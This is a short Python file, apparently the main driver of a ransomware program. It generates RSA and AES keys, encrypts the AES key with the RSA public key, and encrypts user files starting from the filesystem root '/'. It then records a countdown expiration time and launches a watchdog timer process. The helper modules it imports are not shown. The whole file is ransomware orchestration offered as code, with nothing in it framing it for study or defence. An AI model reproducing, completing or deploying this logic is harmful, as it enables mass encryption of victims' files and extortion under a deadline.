import multiprocessing
from datetime import datetime, timedelta
from Variables import seconds_left
from Encrypt import generate_rsa_keys, save_encrypted_aes_key, save_rsa_keys, generate_symmetric_key, encrypt_aes_key_with_rsa, encrypt_user_files
from Timer import save_timer_data, watchdog_timer

####################################################################################################################

# Generate the RSA keys
private_key, public_key = generate_rsa_keys()
save_rsa_keys(private_key, public_key)

# Generate the AES key
symmetric_key = generate_symmetric_key()

# Encrypt AES key with RSA public key and save it
encrypted_aes_key = encrypt_aes_key_with_rsa(symmetric_key, public_key)
save_encrypted_aes_key(encrypted_aes_key)

# Encrypt all files
encrypt_user_files("/", symmetric_key)

start_time = datetime.now()
expiration_time = start_time + timedelta(seconds=seconds_left)

save_timer_data(start_time, expiration_time)

watchdog_process = multiprocessing.Process(target=watchdog_timer)
watchdog_process.start()

####################################################################################################################